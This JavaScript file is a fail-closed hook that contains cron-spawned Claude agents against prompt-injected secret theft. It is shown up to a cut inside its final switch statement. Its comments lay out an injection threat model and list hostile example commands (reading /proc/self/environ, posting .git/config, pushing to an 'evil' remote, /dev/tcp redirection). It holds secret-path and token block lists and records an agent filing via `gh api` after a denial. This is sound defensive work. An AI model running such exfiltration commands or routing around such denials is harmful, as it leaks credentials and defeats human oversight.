#!/usr/bin/env node
// =============================================================================
// Cron containment — deny-by-default PreToolUse hook (v3.1 / #5018, #5000, #5004)
// =============================================================================
//
// PURPOSE. After `sandbox.enabled:false` removes the OS bash sandbox from the
// cron eval substrate (the host-independence fix for the recurring bwrap-userns
// drift), this hook is the SOLE fail-closed containment for cron-spawned
// `claude --print` agents. Phase-0 probes (committed AC0 evidence) proved that
// in headless `--print`:
//   - `--allowedTools` + `defaultMode` do NOT fail-close — non-allowlisted Bash
//     commands RUN; only an explicit `permissions.deny` rule OR a PreToolUse
//     hook blocks. (D0a)
//   - a `Read(/proc/**)` deny does NOT cover `cat /proc/self/environ` run via
//     the Bash tool. (D0b)
//   - a PreToolUse hook returning `permissionDecision:"deny"` DOES block — for
//     Bash AND for Read/Glob/Grep AND (via a `*` matcher) for any other tool.
//     (D0c, D-new-2, D-new-3, the 2.1.79 re-probes)
//   - a crashed/missing hook, OR a tool class with no matcher, FAILS OPEN.
//     (D-new-1) → the substrate runs a spawn-time self-test and registers this
//     hook under a `*` catch-all so no tool class is unhooked.
//
// THREAT. An injected GitHub-issue body / HN comment / social snippet steers a
// cron's model to exfiltrate `ANTHROPIC_API_KEY` (billing abuse) or the broadly
// scoped `GH_TOKEN` (`gh pr merge --auto` on the public auto-deploying repo).
// Exfil needs (a) a secret in model context AND (b) egress. This hook severs
// BOTH: every secret-read path (env dump, `/proc`, `.git/config` where the clone
// URL embeds the token, `.env`, gh/ssh/aws cred files) is denied across Bash AND
// the Read/Glob/Grep tools; every egress verb + every non-allowlisted command is
// denied; argument-injection (`--body-file /proc/self/environ`, `gh api -f
// body=@.git/config`, `git remote add evil && git push evil`) is denied even
// when the leading verb is allowlisted. Secret-never-in-context is the real
// invariant — see SECURITY PANEL P0-A.
//
// CONTRACT. stdin = the PreToolUse JSON; argv[2] = absolute path to the per-cron
// allowlist file (one `verb prefix` per line, `#` comments allowed). The
// allowlist is delivered as a FILE (not env / not an arg the model could read
// via `ps`) and lives under the spawn's `.claude/` which this hook also denies
// reading. Output = the PreToolUse decision JSON on stdout; ALWAYS exit 0.
//
// FAIL-CLOSED. Any parse error, missing field, unreadable allowlist, or
// unrecognized tool resolves to DENY. There is no code path that allows on
// uncertainty. NEVER throw / NEVER `process.exit(non-zero)` — a crash fails OPEN
// (D-new-1), so the whole body is wrapped and the catch emits deny.
// =============================================================================

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

// ---- decision primitives ---------------------------------------------------

// --- Filing justification (#8038) ----------------------------------------
// CLASS 3 OF THE FILING SURFACE. `guardrails:require-filing-justification` in
// .claude/hooks/guardrails.sh covers interactive agents, but a cron-spawned
// agent never loads that chain: buildCronEvalSettings() registers THIS hook as
// the only PreToolUse entry under a `*` matcher. Ten scheduled agents carry
// `gh issue create` via ISSUE_CREATOR_BASH_ALLOWLIST and file discretionary,
// LLM-authored findings -- precisely the audit-exhaust population behind the
// measured 626:39 engineering-to-product skew. Covering only the interactive
// path would have left the primary deliverable missing its primary population.
//
// Exits 1-3 mirror guardrails.sh exactly, so an agent that learns the
// contract on one surface does not have to relearn it on the other. Exit 0
// (the substrate-issued run-report directive, ADR-216 addendum) exists on THIS
// surface only: it is keyed on a file the agent cannot read, which no
// interactive filer has.
//
// This runs AFTER the allowlist match, so it only ever narrows: a cron whose
// allowlist does not carry `gh issue create` is already denied above and never
// reaches here. It cannot widen containment.
// Resolved from THIS MODULE's location, never the CWD. A CWD-relative path
// silently resolves to nothing wherever the process was not started at the repo
// root -- measured: under vitest (cwd apps/web-platform) the read returned
// empty, which degrades exit 2 out of existence while looking like a clean run.
// The sandbox's CWD is not guaranteed either. Same class as guardrails.sh
// resolving its copy via ${BASH_SOURCE[0]%/*}.
const FILING_TAXONOMY_PATH = fileURLToPath(
  new URL("../../../../.claude/hooks/lib/user-surface-taxonomy.txt", import.meta.url),
);

// Does any REAL label token in the (dequoted) segment carry `label`? Six
// spellings — `--label v`, `-l v`, `--label=v`, `-l=v`, `-f labels[]=v`, and a
// bare `labels[]=v` field — comma-split and comma-anchored so `foo/<label>` and
// `<label>x` do not match. Shared by exit 1 (meta/machinery) and exit 0 (the
// run-report directive) so the two exits cannot drift on syntax.
export function labelTokenEquals(tokens, label) {
  const has = (v) => typeof v === "string" && `,${v},`.includes(`,${label},`);
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if ((t === "--label" || t === "-l") && has(tokens[i + 1])) return true;
    if (t.startsWith("--label=") && has(t.slice("--label=".length))) return true;
    if (t.startsWith("-l=") && has(t.slice("-l=".length))) return true;
    if (/^(-f|--field|--raw-field)$/.test(t) &&
        typeof tokens[i + 1] === "string" && tokens[i + 1].startsWith("labels[]=") &&
        has(tokens[i + 1].slice("labels[]=".length))) return true;
    if (t.startsWith("labels[]=") && has(t.slice("labels[]=".length))) return true;
  }
  return false;
}

// Which of the two filing shapes a (dequoted) segment is, or null. ONE
// predicate, shared with the deny-marker (`cron-filing-deny-marker.ts`
// imports it) so "what the gate denies" and "what the marker counts" cannot
// drift. The api form: an issues endpoint token — trailing slash and query
// string included, since gh routes `…/issues?x=1` and `…/issues/` to the same
// create and a `$`-anchored match let both through (#8074 review) — plus a
// POST signal in ANY position: `-X POST`, `--method POST`, `-XPOST`,
// `--method=POST`, `--input <file>` (gh defaults to POST), or a `title=`
// field (gh defaults to POST whenever a field is given).
export function filingShape(tokens) {
  if (tokens[0] !== "gh") return null;
  if (tokens[1] === "issue" && tokens[2] === "create") return "create";
  if (tokens[1] !== "api") return null;
  const endpoint = tokens.some((t) =>
    /(^|\/)repos\/[^/?]+\/[^/?]+\/issues\/?(\?[^/]*)?$/.test(t),
  );
  if (!endpoint) return null;
  const post = tokens.some(
    (t, i) =>
      ((t === "-X" || t === "--method") && tokens[i + 1] === "POST") ||
      t === "-XPOST" ||
      t === "--method=POST" ||
      t === "--input" ||
      (/^(-f|--field|--raw-field|-F)$/.test(t) && /^title=/.test(tokens[i + 1] || "")) ||
      /^(--field=|--raw-field=|-f=)?title=/.test(t),
  );
  return post ? "api" : null;
}

export function filingJustificationReason(tokens, readTaxonomy, runReportLabel = null) {
  // TWO CREATE SHAPES, because this chokepoint's whole reason for existing is
  // the cron population -- and one of the cron allowlists grants the prefix
  // `gh api repos/jikig-ai/soleur/` outright.
  //
  // Matching only `gh issue create` left `gh api .../issues -X POST` a silent
  // ALLOW here: not a narrow exit, a total bypass, for exactly the agents this
  // mirror was added to cover. guardrails.sh already closes that route and says
  // why -- this repo has a DOCUMENTED instance of an agent filing via `gh api`
  // after the `gh issue create` form was denied -- so leaving it open here
  // reopened a known route-around at the second of the two chokepoints.
  const shape = filingShape(tokens);
  if (shape === null) return null;
  const isCreate = shape === "create";
  const isApiIssue = shape === "api";

  // EXIT 0 — the run-report directive (#8076, ADR-216 addendum). The substrate
  // wrote `run-report-label <label>` into THIS spawn's cron-allow.txt for a cron
  // whose run completion is verified by that issue's existence; the agent can
  // neither read nor write the file, so the exit is not narratable. Label only
  // — no title shape (campaign-calendar's REQUIRED filings are
  // `[Content] Overdue: …`). The file-and-vanish path a label-borrowing finding
  // could take is closed by the sweeper, which closes only `[Scheduled]`-titled
  // `app/soleur-ai` issues, and the residue is counted by measurement line 1c.
  if (runReportLabel && labelTokenEquals(tokens, runReportLabel)) return null;

  // EXIT 1 — the machinery ledger. Read a REAL flag token, never prose: the
  // tokens are already dequoted, so a --body that merely NAMES the flag stays
  // inside one token and cannot be mistaken for it. Same six spellings and
  // comma anchoring as exit 0 (`labelTokenEquals`), for the reasons
  // guardrails.sh records: `--label` is a cobra StringSlice so `--label a,b` is
  // ordinary gh syntax, and the api form spells it `-f 'labels[]=…'`.
  if (labelTokenEquals(tokens, "meta/machinery")) return null;

  // The body corpus: the dequoted --body value, or the --body-file contents.
  let body = "";
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t === "--body" || t === "-b") body = tokens[i + 1] || "";
    else if (t.startsWith("--body=")) body = t.slice("--body=".length);
    else if (t === "--body-file" || (t === "-F" && isCreate)) {
      // `-F` is --body-file for `gh issue create`, but --raw-field for `gh api`.
      // Reading the api spelling as a filename would look up a file named
      // `body=...` and fail closed on a filing that supplied its body inline.
      const f = tokens[i + 1] || "";
      try { body = readTaxonomy ? readTaxonomy(f) : ""; } catch { body = ""; }
    }
    // The api form carries the body as a field value, not a flag value.
    else if (/^(-f|--field|--raw-field|-F)$/.test(t) &&
             typeof tokens[i + 1] === "string" && tokens[i + 1].startsWith("body=")) {
      body = tokens[i + 1].slice("body=".length);
    }
    else if (t.startsWith("body=")) body = t.slice("body=".length);
  }

  // EXIT 3 — a rule mandates the filing (ADR-155's closed vocabulary).
  if (/(^|[^A-Za-z0-9_-])Mandated-By:\s*(hr|wg)-[a-z0-9-]+/.test(body)) return null;

  // EXIT 2 — a NAMED user-visible surface AND a MEASURED size above the
  // ADR-131 inline threshold. If the shared taxonomy cannot be read, exit 2
  // simply does not apply -- exits 1 and 3 remain, so a degraded read narrows
  // rather than breaking a cron that files honestly.
  let surfaces = [];
  try {
    const raw = readTaxonomy ? readTaxonomy(FILING_TAXONOMY_PATH) : "";
    surfaces = String(raw).split("\n").map((l) => l.trim())
      .filter((l) => l && !l.startsWith("#"));
  } catch { surfaces = []; }

  if (surfaces.length) {
    const impact = /User-Impact:\s*([^\n]+)/.exec(body);
    const sizes = body.match(/Fix-Size:\s*\d+\s*lines?\s*\/\s*\d+\s*files?/g) || [];
    // Exactly one Fix-Size, or the filing is malformed: with two, whichever the
    // regex binds first is the author's choice, which is not a measurement.
    if (impact && sizes.length === 1) {
      const named = surfaces.some((w) =>
        new RegExp(`\\b${w.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\b`, "i").test(impact[1]));
      const m = /Fix-Size:\s*(\d+)\s*lines?\s*\/\s*(\d+)\s*files?/.exec(sizes[0]);
      if (named && m) {
        const n = Number(m[1]);
        const f = Number(m[2]);
        if (n <= 100 && f <= 4)
          return `filing inside the inline threshold (${n} lines / ${f} files, ADR-131 <=100/<=4) -- fix it inline instead of filing`;
        return null;
      }
    }
  }

  const rrHint = runReportLabel
    ? `, or this cron's own run-report label ${runReportLabel} on a real ${isApiIssue ? "-f 'labels[]='" : "--label"} token`
    : "";
  return isApiIssue
    ? `filing names no user-visible consequence: add -f 'labels[]=meta/machinery', or -f 'body=...' carrying User-Impact: + a measured Fix-Size:, or Mandated-By: <rule-id>${rrHint}`
    : `filing names no user-visible consequence: add --label meta/machinery, or User-Impact: + a measured Fix-Size:, or Mandated-By: <rule-id>${rrHint}`;
}

export function allowDecision() {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
    },
  };
}

export function denyDecision(reason) {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: `cron-containment: ${reason}`,
    },
  };
}

// Secret / credential paths that must never be read by ANY tool (Bash cat,
// Read, Glob, Grep). Matched as substrings against the resolved path argument.
// `.git` is load-bearing: `buildAuthenticatedCloneUrl` writes the GH_TOKEN into
// remote.origin.url → .git/config (SECURITY PANEL P0-A).
const SECRET_PATH_PATTERNS = [
  /(^|\/)\.git(\/|$)/, // .git/config, .git/logs/HEAD, packed-refs
  /(^|\/)proc(\/|$)/, // /proc/self/environ, /proc/*/cmdline
  /\.env(\.[\w-]+)?$/, // .env, .env.local, .env.production
  /(^|\/)\.env(\/|$)/,
  /(^|\/)\.ssh(\/|$)/,
  /(^|\/)\.aws(\/|$)/,
  /(^|\/)\.netrc$/,
  /(^|\/)\.docker(\/|$)/,
  /(^|\/)\.config(\/|$)/, // ~/.config/gh/hosts.yml (gh cred store)
  /(^|\/)\.gitconfig$/,
  /(^|\/)\.git-credentials$/, // git credential-store plaintext (defense-in-depth)
  /(^|\/)\.claude(\/|$)/, // the spawn settings + this hook's allowlist file
  /(^|\/)settings\.json$/,
  /(^|\/)hosts\.ya?ml$/,
  /(^|\/)run\/secrets(\/|$)/,
  /\.npmrc$/,
  // #5199 — cron-ux-audit's bot signs in and writes live Supabase access/
  // refresh tokens to storage-state.json (loaded into the browser context);
  // tmp/ux-audit/ holds findings + screenshots; the playwright-mcp-profile is
  // the browser-resident session store. None must be readable by any tool —
  // else the relaxed cron could Read the session then encode it into an
  // allowlisted `gh`/`browser_navigate` egress call.
  /(^|\/)storage-state\.json$/,
  /(^|\/)tmp\/ux-audit(\/|$)/,
  /(^|\/)playwright-mcp-profile(\/|$)/,
];

// Write/Edit-protected paths: a model rewriting the hook, its allowlist, or the
// settings file would neuter containment on the NEXT tool call (D-new-2).
const WRITE_PROTECTED_PATTERNS = [
  /(^|\/)\.claude(\/|$)/,
  /cron-bash-allowlist-hook/,
  /(^|\/)settings\.json$/,
  /(^|\/)\.git(\/|$)/,
  /\.env(\.[\w-]+)?$/,
];

// Quote-stripping helpers for metachar detection. Shell semantics:
//   - single-quoted spans are fully literal → strip for ALL metachar checks
//     (so `gh api '...' --jq '.[] | {n}'` is not falsely denied — P1-F).
//   - double-quoted spans keep `$(`/`` ` ``/`${` ACTIVE but make `|`/`>`/`<`/`&`
//     literal → strip only for the control-metachar check, KEEP for the
//     substitution check (so `"$(cat .git/config)"` is still denied).
// Returns null on an unbalanced quote (→ caller denies).
function stripQuoted(command, { stripDouble }) {
  let out = "";
  let quote = null;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      if (ch === quote) quote = null;
      else if (quote === '"' && !stripDouble) out += ch; // keep dq contents for subst check
      // else: inside a stripped quote span → drop
    } else if (ch === "'" || ch === '"') {
      quote = ch;
    } else {
      out += ch;
    }
  }
  if (quote) return null; // unbalanced quote
  return out;
}

// Shell metacharacters that enable command substitution / obfuscation /
// redirection / piping / backgrounding. Their presence (OUTSIDE quoting that
// neutralizes them) is an unconditional deny — no Tier-1 cron verb needs them,
// and they are the primary bypass of a leading-verb allowlist
// (`gh issue list && cat /proc/self/environ`, `"$(...)"`, `> /dev/tcp/...`).
// `&&` / `||` / `;` are chain operators handled by segment-splitting.
// Returns a deny reason string, or null if clean.
function dangerousMetacharReason(command) {
  if (/[\n\r]/.test(command)) return "multiline command";
  // substitution: active even inside double quotes → strip only single quotes
  const substScan = stripQuoted(command, { stripDouble: false });
  if (substScan === null) return "unbalanced quote";
  if (/`/.test(substScan)) return "backtick substitution";
  if (/\$\(/.test(substScan)) return "$(...) substitution";
  if (/\$\{/.test(substScan)) return "${...} expansion";
  // A BARE `$NAME` expands too (double quotes do not stop it) and the spawn env
  // carries the installation token and the API key (`buildSpawnEnv`), so
  // `gh issue create --title "$GH_TOKEN"` would post the secret to the public
  // repo with no file read at all. Deny any `$` that starts an expansion
  // (`$name`, `$1`, `$?`, `$$`, `$@`, `$*`, `$#`, `$!`, `$-`); a literal `$`
  // inside single quotes was stripped above and stays allowed.
  if (/\$[A-Za-z_0-9?$@*#!-]/.test(substScan)) return "$VAR expansion";
  if (/<\(|>\(/.test(substScan)) return "process substitution";
  // control metachars: literal inside any quote → strip single AND double
  const ctrlScan = stripQuoted(command, { stripDouble: true });
  if (ctrlScan === null) return "unbalanced quote";
  if (/[<>]/.test(ctrlScan)) return "redirection";
  if (/(^|[^|])\|([^|]|$)/.test(ctrlScan)) return "pipe";
  if (/(^|[^&])&([^&]|$)/.test(ctrlScan)) return "background &";
  return null;
}

// Split a (metachar-free) compound command into segments on && ; ||.
export function splitSegments(command) {
  return command
    .split(/\s*(?:&&|\|\||;)\s*/)
    .map((s) => s.trim())
    .filter(Boolean);
}

// Tokenize a single simple command respecting single/double quotes, so that a
// quoted argument like `--jq '.[] | {n}'` is ONE token (its inner `|` is data,
// not a shell pipe) and the leading-verb match is not fooled by quoting tricks.
// Returns null on an unbalanced quote (→ caller denies).
export function tokenize(segment) {
  const tokens = [];
  let cur = "";
  let quote = null;
  let sawAny = false;
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      sawAny = true;
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      sawAny = true;
    } else if (/\s/.test(ch)) {
      if (cur || sawAny) {
        tokens.push(cur);
        cur = "";
        sawAny = false;
      }
    } else {
      cur += ch;
      sawAny = true;
    }
  }
  if (quote) return null; // unbalanced quote → deny
  if (cur || sawAny) tokens.push(cur);
  return tokens;
}

// Argument-injection / egress-via-allowed-verb denials that apply even when the
// leading verb is allowlisted (SECURITY PANEL P0-B). Returns a deny reason or
// null if clean.
function argumentInjectionReason(tokens) {
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    // gh/curl-style file-as-body flags read a file the model never saw and post
    // it to the public repo: --body-file <path>, -F field=@file, --field f=@f,
    // -f body=@file, gh's `@-`/`@file` value forms.
    if (t === "--body-file" || t === "-F" || t === "--field" || t === "-f") {
      const v = tokens[i + 1] || "";
      if (v.includes("@") || /\.\.|\/(proc|etc|root|home)\b|\.git|\.env/.test(v))
        return `file-as-arg via ${t}`;
    }
    if (/^--body-file=/.test(t)) return "file-as-arg via --body-file=";
    if (/=@/.test(t) || /^@/.test(t)) return "@file argument";
    // VAR=val prefix (env indirection before the verb) — leading token only
    if (i === 0 && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t))
      return "env-assignment prefix";
  }
  return null;
}

// git sub-commands that surface the tokenized remote URL or redirect the authed
// remote — denied regardless of the allowlist (SECURITY PANEL P0-B).
function gitVerbReason(tokens) {
  if (tokens[0] !== "git") return null;
  const sub = tokens[1];
  if (sub === "config") return "git config (reveals remote.origin.url token)";
  if (sub === "remote") return "git remote (set-url/get-url leaks/redirects token)";
  if (sub === "ls-remote") return "git ls-remote (prints remote URL)";
  if (sub === "push") {
    // `--repo <url>` / `--repo=<url>` is documented as equivalent to the
    // positional <repository> arg (git push --help). A `-`-prefixed token
    // escapes the positional filter below, so check it explicitly — else
    // `git push --repo=https://evil/x` is an egress channel past the
    // origin-only enforcer (security-sentinel P1).
    for (let i = 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--repo") {
        if ((tokens[i + 1] ?? "") !== "origin")
          return "git push --repo to a non-origin remote";
      } else if (t.startsWith("--repo=")) {
        if (t.slice("--repo=".length) !== "origin")
          return "git push --repo= to a non-origin remote";
      }
    }
    // a positional push target must be exactly `origin` (or omitted → default).
    const rest = tokens.slice(2).filter((t) => !t.startsWith("-"));
    if (rest.length && rest[0] !== "origin")
      return `git push to non-origin remote '${rest[0]}'`;
  }
  // #5091 — blanket staging denied. The ephemeral workspace carries
  // expected-dirty scaffolding (.claude/ overlay), and blanket flags staged
  // 654 structural deletions into destructive PR #5026. Flag-position-
  // independent: clustered short flags (-fA, -vA) explode to chars; bare
  // `.`/`:/` pathspecs and a literal `*` token stage the whole tree.
  if (sub === "add") {
    const scoped = "stage only the specific files you edited: git add <path> [<path>...]";
    for (let i = 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") continue;
      if (t.startsWith("--")) {
        if (t === "--all" || t === "--update")
          return `blanket git-add flag ${t} denied — ${scoped}`;
        continue;
      }
      if (t.startsWith("-") && t.length > 1) {
        if (/[Au]/.test(t.slice(1)))
          return `blanket git-add flag ${t} denied — ${scoped}`;
        continue;
      }
      const path = t.replace(/^\.\//, "");
      if (t === "." || t === "./" || path.startsWith(":") || t.includes("*"))
        return `git-add pathspec '${t}' denied (stages the whole tree) — ${scoped}`;
      // Absolute paths resolve back into the clone (`git add /abs/cwd` ===
      // `git add .`) and dodge every relative-form check above — no
      // legitimate scoped add in an ephemeral clone uses one.
      if (t.startsWith("/"))
        return `git-add pathspec '${t}' denied (absolute paths can stage the whole tree) — ${scoped}`;
      if (path === ".claude" || path.startsWith(".claude/"))
        return `git-add pathspec '${t}' denied (.claude/ is run-scoped workspace scaffolding, never commit it) — ${scoped}`;
    }
  }
  // `commit -a`/`--all` stages every tracked modification/deletion without
  // any `git add` at all — the same blanket vector through a side door.
  if (sub === "commit") {
    for (let i = 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--all")
        return "git commit --all denied (stages every tracked change, bypassing scoped add) — commit only files you explicitly staged";
      if (t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("a"))
        return `git commit ${t} denied (the -a flag stages every tracked change, bypassing scoped add) — commit only files you explicitly staged`;
    }
  }
  return null;
}

function loadAllowlist(path) {
  if (!path) return null; // no allowlist file → deny-all (fail-closed)
  try {
    return readFileSync(path, "utf-8")
      .split("\n")
      .map((l) => l.trim())
      .filter((l) => l && !l.startsWith("#"));
  } catch {
    return null; // unreadable → deny-all (fail-closed)
  }
}

function segmentMatchesAllowlist(segment, allowPrefixes) {
  // normalize internal whitespace for prefix comparison
  const norm = segment.replace(/\s+/g, " ").trim();
  // A match requires a SEPARATOR after the allowlisted prefix — never a bare
  // continuation of the prefix's final token. The bare `startsWith(p)` clause
  // that was here let `bash …/worktree-manager.sh-pwn` prefix-match the
  // allowlisted `bash …/worktree-manager.sh`, so a prompt-injected model could
  // Write a sibling exfil script then bash it → ALLOW. (Ref #5199 review)
  //
  // The accepted separators are:
  //   - exact equality (a bare allowlisted verb, e.g. `git status`);
  //   - a following SPACE (`verb <space> args`, the common form);
  //   - the prefix itself ENDING in `/` (a path-boundary separator) — this
  //     keeps directory-scoped prefixes like `gh api repos/jikig-ai/soleur/`
  //     matching `gh api repos/jikig-ai/soleur/milestones?…` (a new path
  //     segment under the allowed dir), while STILL denying `.sh-pwn` (the
  //     `.sh` prefix ends in `h`, not `/`, so no bare continuation is allowed).
  return allowPrefixes.some(
    (p) =>
      norm === p ||
      norm.startsWith(p + " ") ||
      (p.endsWith("/") && norm.startsWith(p)),
  );
}

// ---- per-cron policy parsing (#5199 — file-driven mcp__* relaxation) --------
//
// The hook never receives cronName (its only input is the allowlist FILE path),
// so per-cron MCP policy MUST be encoded IN the allowlist file. Two directive
// line shapes extend the bash-prefix format (the rest are bash prefixes):
//   `mcp-allow <tool-name>`   → that exact mcp__* tool is permitted for this cron
//   `navigate-origin <origin>`→ the ONLY origin browser_navigate may load
// A cron whose file carries NO directive lines (every existing cron today) gets
// an empty mcpAllow set + null navigateOrigin → every mcp__* stays catch-all
// denied (the cross-cron negative test asserts this). Directives are NOT bash
// prefixes — they never enter the bash allowlist.
export function parseAllowlist(lines) {
  const bash = [];
  const mcpAllow = new Set();
  let navigateOrigin = null;
  // #8076 / ADR-216 addendum — the third directive shape. Written by the
  // substrate ONLY for the crons whose run completion is verified by their own
  // scheduled issue (`resolveOutputAwareOk` callers + legal-audit). Last match
  // wins, like navigate-origin. Absent for every other cron, so the run-report
  // exit below is unreachable there.
  let runReportLabel = null;
  for (const line of lines) {
    const mcpMatch = /^mcp-allow\s+(\S+)$/.exec(line);
    if (mcpMatch) {
      mcpAllow.add(mcpMatch[1]);
      continue;
    }
    const originMatch = /^navigate-origin\s+(\S+)$/.exec(line);
    if (originMatch) {
      navigateOrigin = originMatch[1];
      continue;
    }
    const rrMatch = /^run-report-label\s+(\S+)$/.exec(line);
    if (rrMatch) {
      runReportLabel = rrMatch[1];
      continue;
    }
    bash.push(line);
  }
  return { bash, mcpAllow, navigateOrigin, runReportLabel };
}

// PREFIX-SHAPED token secrets that must never ride a same-origin URL to the
// allowlisted origin (defense-in-depth atop the secret-read denials — a
// secret-in-URL exfil to app.soleur.ai is the residual leg the content-blind
// egress firewall cannot see). The origin guard below is the load-bearing
// close; this is a best-effort second layer for the allowed origin.
// SCOPE/LIMITS: browserNavigateReason scans the path + search + hash (and
// rejects any userinfo outright), but only matches secrets with a recognizable
// prefix. Notably it does NOT catch a Supabase REFRESH token, which is an
// opaque high-entropy string with no fixed prefix; the JWT pattern below
// catches the Supabase ACCESS token (a JWT) but not the refresh token. The
// storage-state.json read-deny (SECRET_PATH_PATTERNS) is the primary control
// keeping both tokens out of the agent's context in the first place; these
// patterns are not a substitute for it.
const SECRET_QUERY_PATTERNS = [
  /eyJ[A-Za-z0-9_-]{16,}/, // JWT / base64url-JSON header (e.g. Supabase ACCESS token; opaque refresh tokens are NOT matchable)
  /gh[posru]_[A-Za-z0-9]{20,}/, // GitHub PAT / installation / OAuth tokens
  /github_pat_[A-Za-z0-9_]{20,}/,
  /sk-ant-[A-Za-z0-9_-]{16,}/, // Anthropic API key
  /sbp_[A-Za-z0-9]{20,}/, // Supabase access token
  /sk_(live|test)_[A-Za-z0-9]{16,}/, // Stripe secret key
  /xox[bapr]-[A-Za-z0-9-]{10,}/, // Slack tokens
];

// browser_navigate is the only mcp tool that takes an arbitrary URL, so it is
// the only mcp egress vector. Enforce: a navigate-origin MUST be pinned, the
// URL MUST parse, carry NO userinfo, its origin MUST equal the pin, and no
// secret may ride the path / query / fragment. Returns a deny reason, or null
// when the navigation is safe.
function browserNavigateReason(toolInput, navigateOrigin) {
  if (!navigateOrigin)
    return "browser_navigate denied (no navigate-origin pinned for this cron)";
  const url = typeof toolInput.url === "string" ? toolInput.url : "";
  if (!url) return "browser_navigate without a URL";
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    return "browser_navigate with an unparseable URL";
  }
  // Userinfo (`https://<secret>@app.soleur.ai/`) is a same-origin exfil channel
  // a legit audit navigation never needs — deny outright.
  if (parsed.username || parsed.password)
    return "browser_navigate with embedded userinfo (credentials-in-URL)";
  if (parsed.origin !== navigateOrigin)
    return `browser_navigate off-origin (${parsed.origin.slice(0, 60)} != pinned origin)`;
  // Scan path + query + fragment — a secret can ride a path segment to the
  // allowed origin just as easily as a query param.
  const scanTarget = parsed.pathname + parsed.search + parsed.hash;
  if (SECRET_QUERY_PATTERNS.some((re) => re.test(scanTarget)))
    return "browser_navigate with a secret-bearing URL (path/query/fragment)";
  return null;
}

// ---- the decision function (pure; unit-tested) -----------------------------

export function decide(input, allowPrefixes) {
  let parsed;
  try {
    parsed = typeof input === "string" ? JSON.parse(input) : input;
  } catch {
    return denyDecision("unparseable PreToolUse input");
  }
  if (!parsed || typeof parsed !== "object")
    return denyDecision("empty PreToolUse input");

  const tool = parsed.tool_name;
  const ti = parsed.tool_input || {};

  // Deny-all when the allowlist could not be loaded (fail-closed).
  if (allowPrefixes === null) return denyDecision("no allowlist (fail-closed)");

  // Split the file into bash prefixes + the per-cron mcp policy (#5199). A file
  // with no directive lines yields an empty mcpAllow set → mcp__* stays denied.
  const { bash: bashPrefixes, mcpAllow, navigateOrigin, runReportLabel } =
    parseAllowlist(allowPrefixes);

  switch (tool) {
    case "Bash": {
      const command = typeof ti.command === "string" ? ti.command : "";
      if (!command.trim()) return denyDecision("empty Bash command");
      const metaReason = dangerousMetacharReason(command);
      if (metaReason) return denyDecision(`metachar: ${metaReason}`);
      const segments = splitSegments(command);
      if (!segments.length) return denyDecision("no command segment");
      for (const seg of segments) {
        const tokens = tokenize(seg);
        if (tokens === null) return denyDecision("unbalanced quote");
        if (!tokens.length) return denyDecision("empty segment");
        const argReason = argumentInjectionReason(tokens);
        if (argReason) return denyDecision(argReason);
        const gitReason = gitVerbReason(tokens);
        if (gitReason) return denyDecision(gitReason);
        // Match the allowlist against the TOKENIZED (dequoted) command, not the
        // raw segment — otherwise a quoted arg like `gh api 'repos/...'` fails
        // the prefix match against `gh api repos/...` (AC4b single-quote fix).
        if (!segmentMatchesAllowlist(tokens.join(" "), bashPrefixes))
          return denyDecision(`not allowlisted: ${seg.slice(0, 60)}`);
        // Narrows only: an allowlisted `gh issue create` must still justify.
        // The run-report directive (exit 0) is threaded from the parsed file,
        // never from the command or the environment.
        const filingReason = filingJustificationReason(
          tokens,
          (f) => readFileSync(f, "utf8"),
          runReportLabel,
        );
        if (filingReason) return denyDecision(filingReason);
      }
      return allowDecision();
    }
    case "Read":
    case "Glob":
    case "Grep": {
      const p = ti.file_path || ti.path || ti.pattern || "";
      const grepPath = ti.path || "";
      for (const target of [p, grepPath]) {
        if (target && SECRET_PATH_PATTERNS.some((re) => re.test(target)))
          return denyDecision(`secret-path read: ${target.slice(0, 60)}`);
      }
      return allowDecision();
    }
    case "Write":
    case "Edit":
    case "MultiEdit": {
      const p = ti.file_path || ti.path || "";
      if (WRITE_PROTECTED_PATTERNS.some((re) => re.test(p)))
        return denyDecision(`protected-path write: ${p.slice(0, 60)}`);
      return allowDecision();
    }
    case "ToolSearch":
    case "TodoWrite":
      // Inert internal tools: ToolSearch only loads deferred tool SCHEMAS (no
      // execution/egress — discovery ≠ execution; a discovered mcp__*/WebFetch
      // still hits the catch-all deny when CALLED); TodoWrite mutates in-memory
      // task state. Denying them breaks the agent's tool plumbing for zero
      // security gain. (Confirmed needed by the 2.1.79 real-spawn probe.)
      return allowDecision();
    case "Task":
    case "Agent":
    case "Skill":
      // Tier-2 relax-minimal (#5046 PR-2, AC-P2.1): sub-agent spawn + skill
      // invocation leave the catch-all deny. Safe because they execute through
      // hooked tools: sub-agents inherit this hook via the `*` matcher in the
      // spawn's .claude/settings.json (their interior Bash/Read/etc. hit the
      // SAME containment above — probed by runHookSelfTest's Task gate), and a
      // Skill body's commands run as ordinary hooked tool calls. The Task tool
      // surfaces as "Task" on some CLI versions and "Agent" on others — both
      // name the same sub-agent class, so both are listed explicitly (a NEW
      // tool class still falls through to the deny below). WebFetch/WebSearch/
      // mcp__* remain denied: no restored cron needs them; pure egress surface.
      return allowDecision();
    default: {
      // #5199 — file-driven per-cron mcp__* relaxation. A cron whose allowlist
      // file lists `mcp-allow <tool>` may use exactly those mcp__* tools; every
      // OTHER mcp__* tool, plus WebFetch/WebSearch (never mcp-prefixed) and any
      // new tool class, stays denied. browser_navigate additionally passes the
      // URL-origin + secret-query guard. A file with no mcp-allow lines (every
      // existing cron) has an empty set → this whole branch denies, preserving
      // the original catch-all (the cross-cron negative test asserts this).
